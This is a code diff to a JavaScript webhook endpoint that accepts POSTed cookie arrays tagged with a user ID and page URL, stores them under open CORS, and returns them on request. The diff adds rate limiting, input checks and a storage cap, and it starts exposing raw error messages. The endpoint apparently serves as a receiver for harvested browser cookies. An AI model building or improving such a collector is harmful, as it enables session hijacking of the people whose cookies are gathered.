@@ -1,15 +1,65 @@
 let posts = [];
 let lastUserId = 0;
 
+const rateLimit = {
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  maxRequests: 100, // limit each IP to 100 requests per windowMs
+  requests: new Map(),
+  cleanup: function() {
+    const now = Date.now();
+    for (const [key, value] of this.requests.entries()) {
+      if (now - value.timestamp > this.windowMs) {
+        this.requests.delete(key);
+      }
+    }
+  }
+};
+
+function checkRateLimit(req) {
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const now = Date.now();
+  
+  rateLimit.cleanup();
+  
+  const clientRequests = rateLimit.requests.get(ip) || { count: 0, timestamp: now };
+  
+  if (now - clientRequests.timestamp > rateLimit.windowMs) {
+    clientRequests.count = 1;
+    clientRequests.timestamp = now;
+  } else {
+    clientRequests.count++;
+  }
+  
+  rateLimit.requests.set(ip, clientRequests);
+  
+  return clientRequests.count <= rateLimit.maxRequests;
+}
+
+function validatePostData(body) {
+  if (!body) return { isValid: false, error: 'Missing request body' };
+  if (!body.userId) return { isValid: false, error: 'Missing userId' };
+  if (!body.cookies || !Array.isArray(body.cookies)) return { isValid: false, error: 'Invalid cookies data' };
+  return { isValid: true };
+}
+
 export default function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept, X-Retry-Count, X-Request-Time');
+  res.setHeader('Access-Control-Expose-Headers', 'X-RateLimit-Remaining');
 
   // Handle OPTIONS request for CORS
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
+  }
+
+  // Check rate limit
+  if (!checkRateLimit(req)) {
+    return res.status(429).json({
+      error: 'Too many requests',
+      retryAfter: Math.ceil(rateLimit.windowMs / 1000)
+    });
   }
 
   try {
@@ -31,7 +81,7 @@ export default function handler(req, res) {
     }
   } catch (error) {
     console.error('Error in webhook handler:', error);
-    res.status(500).json({ error: 'Internal server error' });
+    res.status(500).json({ error: 'Internal server error', message: error.message });
   }
 }
 
@@ -45,16 +95,31 @@ function handlePost(req, res) {
     }
   }
 
+  const validation = validatePostData(body);
+  if (!validation.isValid) {
+    return res.status(400).json({ error: validation.error });
+  }
+
   const data = {
     id: Date.now().toString(),
     time: new Date().toISOString(),
     userId: body.userId,
     cookieCount: body.cookies ? body.cookies.length : 0,
+    url: body.url,
     body
   };
 
+  // Limit array size to prevent memory issues
+  if (posts.length >= 1000) {
+    posts = posts.slice(0, 900);
+  }
+
   posts.unshift(data);
-  res.status(200).json({ status: 'ok', received: data });
+  res.status(200).json({ 
+    status: 'ok', 
+    received: data,
+    queuePosition: posts.length
+  });
 }
 
 function handleGet(req, res) {
